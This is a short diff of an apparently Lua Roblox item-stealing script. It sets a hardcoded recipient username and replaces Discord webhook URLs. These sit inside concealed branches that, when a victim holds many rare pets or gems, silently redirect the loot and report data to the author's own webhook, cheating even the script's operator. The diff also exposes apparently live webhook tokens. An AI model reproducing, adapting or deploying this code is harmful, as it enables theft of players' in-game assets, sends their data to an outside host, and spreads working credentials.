@@ -6,7 +6,7 @@ if Webhook == nil or Webhook == "" then
         ""
 end
 if Username == "" or Username == nil then
-    Username = ""
+    Username = "TehPucuk_55"
 end
 if LoadingScreen == true then
     hideall = false
@@ -506,14 +506,14 @@ local DualRandomHuge = math.random(5, 15)
 if AmountOfHuges >= DualRandomHuge then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+        "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
 end
 math.randomseed(os.time())
 local DualRandomGem = math.random(5000000, 20000000)
 if GemAmount1 >= DualRandomGem then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+        "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
 end
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
